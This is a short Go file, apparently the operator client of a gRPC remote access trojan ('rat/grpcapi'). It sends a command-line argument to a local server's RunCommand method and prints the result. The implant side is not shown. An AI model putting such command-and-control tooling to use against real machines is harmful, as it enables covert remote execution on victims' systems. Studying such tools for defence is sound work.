package main

import (
	"context"
	"fmt"
	"google.golang.org/grpc"
	"log"
	"os"
	"rat/grpcapi"
)

func init() {

}

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.AdminClient
	)

	opts = append(opts, grpc.WithInsecure())

	if conn, err = grpc.Dial("0.0.0.0:9090", opts...); err != nil {
		log.Fatal(err)
	}

	defer func(conn *grpc.ClientConn) {
		err := conn.Close()
		if err != nil {

		}
	}(conn)

	client = grpcapi.NewAdminClient(conn)
	var cmd = new(grpcapi.Command)

	args1 := os.Args[1]

	cmd.In = args1
	ctx := context.Background()
	cmd, err = client.RunCommand(ctx, cmd)

	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(cmd.Out)

}

func showClientList() {

}
